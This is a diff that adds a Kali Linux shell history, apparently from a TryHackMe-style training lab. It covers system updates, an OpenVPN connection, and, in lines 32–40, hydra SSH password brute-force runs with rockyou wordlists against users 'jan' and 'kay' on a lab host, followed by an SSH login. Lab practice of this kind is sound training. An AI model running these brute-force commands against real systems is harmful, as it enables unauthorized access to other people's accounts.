@@ -1,0 +1,42 @@
+    1  sudo apt install kali-wallpapers-2023
+    2  sudo apt update
+    3  sudo apt upgrade
+    4  sudo apt full-upgrade -y
+    5  sudo apt upgrade
+    6  sudo kali-tweanks
+    7  sudo apt upgrade
+    8  sudo apt clean
+    9  sudo apt upgrade && sudo apt full
+   10  sudo apt -o Acquire::ForceIP
+   11  sudo apt -o Acquire: :ForceIP
+   12  sudo apt -o Acquire::ForceIP
+   13  sudo apt -o Acquire::ForceIP =<ipv4> 
+   14  sudo apt -o Acquire::ForceIP 
+   15  sudo apt -o Acquire::ForceIPv4=true 
+   16  sudo apt -o Acquire::ForceIPv4=true update && sudo apt -o Acquire::ForceIPv4=true full-upgrade
+   17  password=[REDACTED] kali
+   18  passwd=[REDACTED] kali
+   19  sudo apt install openvpn
+   20  sudo apt autoremove
+   21  sudo apt install openvpn
+   22  sudo apt update\nsudo apt install openvpn\n
+   23  sudo apt update && sudo apt upgrade
+   24  sudo openvpn ~/Downloads/username.ovpn
+   25  ls -la ~/Downloads/*.ovpn\n# si no aparece nada:\nfind ~ -iname "*.ovpn" 2>/dev/null
+   26  ip a | grep tun0
+   27  vpn
+   28  sudo openvpn ~/Downloads/us-east-1-veram321422-regular.ovpn
+   29  ip a | grep tun0
+   30  ping -c 4 10.65.148.83 
+   31  cd ~/TP_THM && pwd && git branch && ls -la 
+   32  head -n 50000 /usr/share/wordlists/rockyou.txt > bitacora/wordlist_corta.txt\nnohup hydra -l jan -P bitacora/wordlist_corta.txt -t 1 -f 10.65.148.83 ssh > bitacora/hydra_jan.txt 2>&1 &
+   33  tail -f bitacora/hydra_jan.txt
+   34  kill 5114
+   35  jobs
+   36  head -n 10000 /usr/share/wordlists/rockyou.txt > bitacora/wordlist_corta.txt\nnohup hydra -l jan -P bitacora/wordlist_corta.txt -t 4 -f 10.65.148.83 ssh > bitacora/hydra_jan.txt 2>&1 &
+   37  tail -f bitacora/hydra_jan.txt
+   38  kill 7158
+   39  jobs
+   40  head -n 1000 /usr/share/wordlists/rockyou.txt > bitacora/wordlist_rapida.txt\necho -e 'kay\njan' > bitacora/users.txt\nhydra -L bitacora/users.txt -P bitacora/wordlist_rapida.txt -t 8 -f 10.65.148.83 ssh | tee bitacora/hydra_rapido.txt
+   41  ssh jan@10.65.148.83
+   42  cd ~/TP_THM
